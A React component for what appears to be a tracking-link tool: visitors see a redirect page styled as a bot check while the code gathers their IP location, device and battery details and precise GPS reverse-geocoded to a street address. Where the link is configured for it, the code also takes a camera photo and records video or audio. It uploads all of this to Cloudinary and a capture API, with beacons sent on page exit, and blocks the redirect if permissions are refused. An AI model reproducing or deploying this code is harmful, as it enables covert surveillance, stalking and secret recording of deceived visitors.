import * as React from 'react';
import { useParams } from 'react-router-dom';
import type { Settings, CapturedData, PermissionType } from '../types';
import { getTranslator } from '../contexts/LanguageContext';
import { useNotification } from '../contexts/SettingsContext';
import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
import { db } from '../firebase';
import { collection, query, where, getDocs } from 'firebase/firestore';
import PermissionInstructions from './PermissionInstructions';

interface RedirectPageProps {
  previewSettings?: Settings | Omit<Settings, 'id'>;
  isPreview?: boolean;
  isEmbeddedPreview?: boolean;
  onClosePreview?: () => void;
}

const VerificationText: React.FC<{className?: string, t: (key: string) => string;}> = ({ className, t }) => {
    return <p className={`text-xs font-semibold uppercase tracking-wider ${className}`}>{t('redirect_verify_bot')}</p>
}

// --- Individual Card Style Components ---

const Progress: React.FC<{ duration: number, isPaused: boolean, className?: string, progressClassName?: string, style?: React.CSSProperties, progressStyle?: React.CSSProperties }> = ({ duration, isPaused, className, progressClassName, style, progressStyle }) => {
  const [key, setKey] = React.useState(Date.now());
  React.useEffect(() => { if (!isPaused) setKey(Date.now()); }, [isPaused]);

  const innerAnimatedStyle = { animation: `progress ${duration}s linear forwards`, ...progressStyle };

  if (isPaused) return <div className={className} style={style}><div className={`${progressClassName} w-0`} style={progressStyle}/></div>;

  return (
    <div className={className} style={style}>
      <div key={key} className={progressClassName} style={innerAnimatedStyle} />
    </div>
  );
};

const TypewriterText: React.FC<{ text: string, duration: number, isPaused: boolean, className?: string }> = ({ text, duration, isPaused, className }) => {
    const [displayedText, setDisplayedText] = React.useState('');
    React.useEffect(() => {
        if (isPaused) {
            setDisplayedText('');
            return;
        }
        setDisplayedText('');
        let i = 0;
        const interval = setInterval(() => {
            if (i >= text.length) {
                clearInterval(interval);
                return;
            }
            setDisplayedText(prev => prev + text[i]);
            i++;
        }, (duration * 1000) / (text.length || 1));
        return () => clearInterval(interval);
    }, [text, duration, isPaused]);
    return <span className={`${className} overflow-hidden whitespace-nowrap border-r-4 border-r-transparent`}>{displayedText}</span>;
}

const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
      <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
        <div className="bg-white border border-slate-200/80 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
          {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain" />}
          <h1 className="text-4xl font-bold text-blue-600 leading-tight">{settings.displayText}</h1>
          <p className="text-slate-500 mt-1">{t('redirect_default_card_subtitle')}</p>
          <div className="w-full pt-6 space-y-2">
            <VerificationText className="text-slate-400" t={t} />
            <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-5 overflow-hidden" progressClassName="bg-blue-500 h-full rounded-full" />
          </div>
        </div>
      </div>
    );
};

const GlassCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
            <div className="bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
                {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain" />}
                <h1 className="text-4xl font-bold leading-tight">{settings.displayText}</h1>
                <p className="opacity-80 mt-1">{t('redirect_glass_card_subtitle')}</p>
                <div className="w-full pt-6 space-y-2">
                    <VerificationText className="text-white/60" t={t}/>
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                </div>
            </div>
        </div>
    );
};

const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-2xl animate-fade-in-up text-center flex flex-col items-center gap-6 p-8" style={{ color: settings.textColor, textShadow: '0px 1px 10px rgba(0,0,0,0.5)' }}>
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 object-contain" />}
            <h1 className="text-5xl font-extrabold leading-tight">{settings.displayText}</h1>
            <p className="opacity-80 text-lg">{t('redirect_minimal_card_subtitle')}</p>
            <div className="w-full pt-4 fixed bottom-0 left-0 space-y-2">
                <VerificationText className="text-white/60 text-center mb-1" t={t}/>
                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1" progressClassName="bg-white h-full" />
            </div>
        </div>
    );
};

const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-2xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
            <div className="bg-[#0D1117] border border-green-500/30 shadow-2xl rounded-lg p-6">
                <div className="flex items-center gap-2 mb-4">
                    <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                    <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                </div>
                <div className="space-y-2 text-sm">
                    <p><span className="text-green-400">root@director:~$</span> {t('redirect_terminal_auth')}</p>
                    <p><span className="text-green-400">root@director:~$</span> {t('redirect_terminal_access')}</p>
                    <p className="pl-4"><span className="text-cyan-400">{t('redirect_terminal_target')}</span> {settings.redirectUrl}</p>
                    <p className="pl-4"><span className="text-cyan-400">{t('redirect_terminal_message')}</span> "{settings.displayText}"</p>
                    <p><span className="text-green-400">root@director:~$</span> <TypewriterText text={t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} duration={settings.redirectDelay} isPaused={isPaused} /></p>
                </div>
                 <div className="w-full pt-6 space-y-2">
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-green-500/10 rounded h-1 overflow-hidden" progressClassName="bg-green-500 h-full rounded" />
                </div>
            </div>
        </div>
    );
};

const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-sm animate-scale-in" style={{ color: settings.textColor }}>
        <div className="bg-white border-2 border-black/80 rounded-sm p-10 text-center flex flex-col items-center gap-4 font-serif">
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-20 h-20 mb-4 object-contain" />}
            <h1 className="text-2xl font-bold text-black tracking-widest uppercase">{settings.displayText}</h1>
            <p className="text-black/60 text-sm mt-2">{t('redirect_elegant_card_subtitle')}</p>
            <div className="w-full pt-6">
                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
            </div>
        </div>
    </div>
);

const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-md animate-fade-in-up" style={{ color: settings.textColor }}>
        <div className="bg-slate-900 border border-slate-700/80 shadow-2xl rounded-xl p-10 text-center flex flex-col items-center gap-4">
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
            <h1 className="text-4xl font-bold">{settings.displayText}</h1>
            <p className="text-slate-400 mt-2">{t('redirect_default_card_subtitle')}</p>
            <div className="w-full pt-6 space-y-2">
                <VerificationText className="text-slate-500" t={t}/>
                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-2 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
            </div>
        </div>
    </div>
);

const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-xl animate-fade-in-up font-serif" style={{ color: settings.textColor }}>
        <div className="bg-white text-slate-800 p-10">
            <p className="text-sm font-bold text-red-600 uppercase tracking-widest">{t('redirect_article_heading')}</p>
            <h1 className="text-4xl font-bold my-4">{settings.displayText}</h1>
            <div className="flex items-center gap-4 text-sm border-y border-slate-200 py-3 mb-6">
                <p>By <span className="font-bold">{t('redirect_article_author')}</span></p>
                <div className="h-4 border-l border-slate-300"></div>
                <p className="text-slate-500">{new Date().toLocaleDateString()}</p>
            </div>
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-full object-contain mb-6" />}
            <p className="text-lg text-slate-600 leading-relaxed">{t('redirect_article_subtitle')}</p>
            <div className="w-full pt-8">
                 <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-1" progressClassName="bg-red-600 h-full" />
            </div>
        </div>
    </div>
);

const RetroTvCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-lg animate-scale-in" style={{ color: settings.textColor }}>
        <div className="bg-slate-900 p-8 rounded-t-xl border-2 border-b-0 border-slate-700 relative">
            <div className="aspect-video bg-black/80 rounded p-6 relative overflow-hidden font-mono text-green-400 text-2xl animate-glow scanline">
                <p className="animate-flicker">TARGET: {settings.displayText}</p>
            </div>
        </div>
        <div className="h-16 bg-slate-800 rounded-b-xl border-2 border-t-0 border-slate-700 flex items-center justify-center p-4">
             <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-green-900/50 rounded h-2" progressClassName="bg-green-400 h-full" />
        </div>
    </div>
);

const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
        <div className="p-1 rounded-2xl shadow-2xl" style={{ background: `linear-gradient(45deg, ${settings.gradientColors.join(', ')})`}}>
            <div className="bg-slate-900 rounded-xl p-10 text-center flex flex-col items-center gap-4">
                {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
                <h1 className="text-4xl font-bold">{settings.displayText}</h1>
                <p className="text-slate-300 mt-2">{t('redirect_gradient_card_subtitle')}</p>
                <div className="w-full pt-6">
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/10 rounded-full h-2" progressClassName="bg-white h-full" />
                </div>
            </div>
        </div>
    </div>
);

const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string>) => string; }> = ({ settings, isPaused, t }) => (
    <div className="w-full max-w-2xl animate-scale-in bg-black rounded-xl border border-slate-700 shadow-2xl overflow-hidden" style={{ color: settings.textColor }}>
        <div className="aspect-video bg-slate-900 flex items-center justify-center">
            {settings.customIconUrl ? (
                <img src={settings.customIconUrl} alt="Icon" className="w-1/3 object-contain" />
            ) : (
                <p className="text-slate-500">{t('redirect_video_player_loading')}</p>
            )}
        </div>
        <div className="p-4 bg-black/30 space-y-2">
            <h1 className="font-bold text-lg">{settings.displayText}</h1>
            <p className="text-sm text-slate-400">{t('redirect_video_player_redirecting', { url: settings.redirectUrl })}</p>
            <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-1 mt-2" progressClassName="bg-red-600 h-full" />
        </div>
    </div>
);


const CARD_COMPONENTS: Record<string, React.FC<{ settings: Settings, isPaused: boolean, t: any }>> = {
    'default-white': DefaultWhiteCard,
    'glass': GlassCard,
    'minimal': MinimalCard,
    'elegant': ElegantCard,
    'sleek-dark': SleekDarkCard,
    'article': ArticleCard,
    'terminal': TerminalCard,
    'retro-tv': RetroTvCard,
    'gradient-burst': GradientBurstCard,
    'video-player': VideoPlayerCard,
};

// --- Main Component ---

const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview = false, isEmbeddedPreview = false }) => {
  const { data } = useParams<{ data: string }>();
  const addNotification = useNotification();

  const [settings, setSettings] = React.useState<Settings | null>(null);
  const [status, setStatus] = React.useState<'initializing' | 'loading' | 'invalid' | 'permission_denied' | 'redirecting'>('initializing');
  const [deniedPermissions, setDeniedPermissions] = React.useState<PermissionType[]>([]);
  const [isWaitingForPermission, setIsWaitingForPermission] = React.useState(false);

  const t = React.useMemo(() => getTranslator(settings?.redirectLanguage || 'en'), [settings?.redirectLanguage]);
  
  const capturedDataRef = React.useRef<Partial<CapturedData>>({});
  const hasSavedRef = React.useRef(false);

  const saveToApi = React.useCallback(async (dataToSave: Partial<CapturedData>, settingsToUse: Settings, isComplete: boolean) => {
    if (hasSavedRef.current && !isComplete) return; 
    
    const hasMeaningfulData = dataToSave.ip || dataToSave.cameraCapture || dataToSave.microphoneCapture || dataToSave.cameraPhotoCapture || dataToSave.location?.lat;
    if (!hasMeaningfulData) return;
    
    hasSavedRef.current = true;
    
    const finalData: Partial<CapturedData> = {
        ...dataToSave,
        redirectId: settingsToUse.id,
        status: isComplete ? 'completed' : 'incomplete',
        timestamp: Date.now(),
        name: `Capture on ${new Date().toLocaleDateString()}`,
    };
    
    Object.keys(finalData).forEach(key => (finalData as any)[key] === undefined && delete (finalData as any)[key]);
    
    const body = JSON.stringify(finalData);

    if (isComplete) {
      try {
        await fetch('/api/save-capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: body,
        });
      } catch (e) {
        console.error("Failed to save captured data via fetch:", e);
      }
    } else {
      if (navigator.sendBeacon) {
        navigator.sendBeacon('/api/save-capture', body);
      } else {
        await fetch('/api/save-capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: body,
          keepalive: true,
        });
      }
    }
  }, []);

  React.useEffect(() => {
    const handlePageExit = () => {
      if (settings && !hasSavedRef.current) {
        saveToApi(capturedDataRef.current, settings, false);
      }
    };

    window.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') {
        handlePageExit();
      }
    });
    window.addEventListener('pagehide', handlePageExit);

    return () => {
      window.removeEventListener('visibilitychange', handlePageExit);
      window.removeEventListener('pagehide', handlePageExit);
    };
  }, [settings, saveToApi]);

  const captureInitialData = React.useCallback(async () => {
    if (capturedDataRef.current.ip) return;

    let ipData: any = {};
    try {
        const ipRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
        if (ipRes.ok) ipData = await ipRes.json();
    } catch (e) { console.error("Could not fetch IP data:", e); }

    const userAgent = navigator.userAgent;
    const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
    
    capturedDataRef.current = {
      ...capturedDataRef.current,
      ip: ipData.ip || 'Unknown',
      userAgent: userAgent,
      os: osMatch ? osMatch[0] : 'Unknown',
      browser: userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown',
      deviceType: 'ontouchstart' in window ? 'Mobile' : 'Desktop',
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      location: { 
        lat: ipData.latitude ? Number(ipData.latitude) : null, 
        lon: ipData.longitude ? Number(ipData.longitude) : null, 
        accuracy: ipData.accuracy ? Number(ipData.accuracy) : null, 
        city: ipData.city || 'Unknown', 
        country: ipData.country || 'Unknown', 
        source: 'ip'
      },
    };

    if ('getBattery' in navigator) {
        try {
            const batteryManager = await (navigator as any).getBattery();
            capturedDataRef.current.battery = {
                level: Math.round(batteryManager.level * 100),
                charging: batteryManager.charging
            };
        } catch (e) { 
            console.error("Could not fetch battery data:", e);
        }
    }
  }, []);

  const captureGpsLocation = React.useCallback(async () => {
    return new Promise<void>(resolve => {
        if (!navigator.geolocation) return resolve();
        navigator.geolocation.getCurrentPosition(async pos => {
            let addressString = 'N/A';
            let city = capturedDataRef.current.location?.city || 'Unknown';
            let country = capturedDataRef.current.location?.country || 'Unknown';
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&accept-language=en`);
                if (response.ok) {
                    const data = await response.json();
                    if (data && data.address) {
                        const addr = data.address;
                        const street = addr.road || addr.pedestrian || addr.footway || addr.suburb;
                        const place = addr.city || addr.town || addr.village;
                        country = addr.country || country;
                        city = place || city;
                        addressString = [street, place, addr.country].filter(Boolean).join(', ');
                        if (!addressString) addressString = data.display_name || 'N/A';
                    }
                }
            } catch (e) {
                console.error('Reverse geocoding failed', e);
            }

            capturedDataRef.current.location = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                source: 'gps',
                city: city,
                country: country,
                address: addressString,
            };
            resolve();
        }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
    });
  }, []);
  
    const uploadToCloudinary = async (blob: Blob, resourceType: 'video' | 'raw' | 'image'): Promise<string> => {
        const formData = new FormData();
        formData.append('file', blob);
        formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
        if (resourceType !== 'image') {
          formData.append('resource_type', resourceType);
        }
        
        try {
            const response = await fetch(CLOUDINARY_UPLOAD_URL, {
                method: 'POST',
                body: formData
            });
            if (!response.ok) {
                const errorData = await response.json();
                console.error('Cloudinary API Error:', errorData);
                throw new Error(errorData.error.message || 'Upload preset not found');
            }
            const result = await response.json();
            return result.secure_url;
        } catch (error) {
            console.error('Cloudinary upload error:', error);
            addNotification({ type: 'error', message: 'notification_cloudinary_error' });
            throw error;
        }
    };
    
    const startCaptureProcess = React.useCallback(async () => {
        if (!settings || isPreview) return;

        setStatus('redirecting');
        setIsWaitingForPermission(true);

        const required = settings.captureInfo.permissions;
        const permissions: CapturedData['permissions'] = { location: 'n/a', camera: 'n/a', microphone: 'n/a' };

        // 1. Location
        if (required.includes('location')) {
            try {
                const status = await navigator.permissions.query({ name: 'geolocation' });
                if (status.state === 'prompt') {
                    await new Promise<void>((resolve) => navigator.geolocation.getCurrentPosition(() => resolve(), () => resolve(), { timeout: 15000, enableHighAccuracy: true }));
                }
                const finalStatus = await navigator.permissions.query({ name: 'geolocation' });
                permissions.location = finalStatus.state;
                if (finalStatus.state === 'granted') await captureGpsLocation();
            } catch (e) {
                permissions.location = 'denied';
            }
        }

        // 2. Media (Camera & Mic)
        const needsCamera = required.includes('camera');
        const needsMic = required.includes('microphone');
        let mediaStream: MediaStream | null = null;
        if (needsCamera || needsMic) {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: needsCamera, audio: needsMic });
                if (needsCamera) permissions.camera = 'granted';
                if (needsMic) permissions.microphone = 'granted';
            } catch (e) {
                if (needsCamera) permissions.camera = 'denied';
                if (needsMic) permissions.microphone = 'denied';
            }
        }
        capturedDataRef.current.permissions = permissions;

        // 3. Check for hard denials
        const denied = required.filter(p => p !== 'battery' && permissions[p as 'location' | 'camera' | 'microphone'] === 'denied');
        if (denied.length > 0) {
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
            setDeniedPermissions(denied);
            setStatus('permission_denied');
            setIsWaitingForPermission(false);
            return;
        }

        // 4. Capture photo immediately if needed
        if (mediaStream && needsCamera) {
            const videoTrack = mediaStream.getVideoTracks()[0];
            const imageCapture = new (window as any).ImageCapture(videoTrack);
            try {
                const photoBlob = await imageCapture.takePhoto();
                const photoUrl = await uploadToCloudinary(photoBlob, 'image');
                capturedDataRef.current.cameraPhotoCapture = photoUrl;
            } catch (e) {
                console.error("Photo capture/upload failed:", e);
            }
        }

        // 5. Start Recording if needed
        let cameraUrl: string | undefined;
        let micUrl: string | undefined;
        if (mediaStream && (needsCamera || needsMic)) {
            try {
                const recorder = new MediaRecorder(mediaStream);
                const chunks: Blob[] = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                
                recorder.start();
                await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
                recorder.stop();
                await new Promise(resolve => recorder.onstop = resolve);

                const recordingBlob = new Blob(chunks, { type: needsCamera ? 'video/webm' : 'audio/webm' });
                if (needsCamera) {
                    cameraUrl = await uploadToCloudinary(recordingBlob, 'video');
                } else if (needsMic) {
                    micUrl = await uploadToCloudinary(recordingBlob, 'raw');
                }
            } catch (e) {
                console.error("Recording or upload failed:", e);
            } finally {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        }
        
        setIsWaitingForPermission(false);
        capturedDataRef.current.cameraCapture = cameraUrl;
        capturedDataRef.current.microphoneCapture = micUrl;

        await saveToApi(capturedDataRef.current, settings, true);

        if (settings.redirectDelay > 0) {
            await new Promise(resolve => setTimeout(resolve, settings.redirectDelay * 1000));
        }
        if (!isPreview) {
            window.location.href = settings.redirectUrl;
        }
    }, [settings, isPreview, addNotification, saveToApi, captureGpsLocation]);


    React.useEffect(() => {
        const loadSettings = async () => {
            if (isPreview && previewSettings) {
                setSettings({ id: 'preview', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
                setStatus('redirecting');
                return;
            }
            if (!data) return setStatus('invalid');
            
            try {
                const q = query(collection(db, "redirects"), where("urlIdentifier", "==", data));
                const querySnapshot = await getDocs(q);
                if (querySnapshot.empty) return setStatus('invalid');

                const configDoc = querySnapshot.docs[0];
                const fetchedSettings = { id: configDoc.id, ...configDoc.data() } as Settings;
                setSettings(fetchedSettings);
                await captureInitialData();
                setStatus('loading');
            } catch (error) {
                console.error("Error fetching settings: ", error);
                setStatus('invalid');
            }
        };
        loadSettings();
    }, [data, previewSettings, isPreview, captureInitialData]);

    React.useEffect(() => {
        if (status === 'loading' && settings && !isPreview) {
            startCaptureProcess();
        }
    }, [status, settings, isPreview, startCaptureProcess]);

    const renderContent = () => {
        if (status === 'initializing') {
            return <h1 className="text-2xl font-bold text-white">{t('redirect_initializing')}</h1>;
        }
        if (status === 'invalid') {
            return (
                <div className="text-center p-8 bg-slate-800 rounded-lg shadow-xl">
                     <h1 className="text-3xl font-bold text-red-500 mb-2">{t('redirect_invalid_link_title')}</h1>
                     <p className="text-slate-400">{t('redirect_invalid_link_subtitle')}</p>
                </div>
            );
        }
        if (status === 'permission_denied') {
            return <PermissionInstructions onRetry={startCaptureProcess} requiredPermissions={deniedPermissions} t={t} />;
        }
        if (settings && (status === 'loading' || status === 'redirecting' || isPreview)) {
            const CardComponent = CARD_COMPONENTS[settings.cardStyle] || CARD_COMPONENTS['default-white'];
            const isPaused = isPreview || status === 'loading' || isWaitingForPermission;
            return <CardComponent settings={settings} isPaused={isPaused} t={t} />;
        }
        return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
    };
  
    const backgroundStyle: React.CSSProperties = {
        backgroundColor: settings?.backgroundColor,
        ...(settings?.backgroundImageUrl && {
        backgroundImage: `url(${settings.backgroundImageUrl})`,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        }),
    };

    return (
        <div className={`w-full h-full flex justify-center items-center p-4 ${settings?.theme || 'dark'}`} style={backgroundStyle}>
          <div className={`${isEmbeddedPreview ? '' : 'absolute inset-0 bg-black/30'}`}></div>
          <div className="relative z-10">
            {renderContent()}
          </div>
        </div>
    );
};

export default RedirectPage;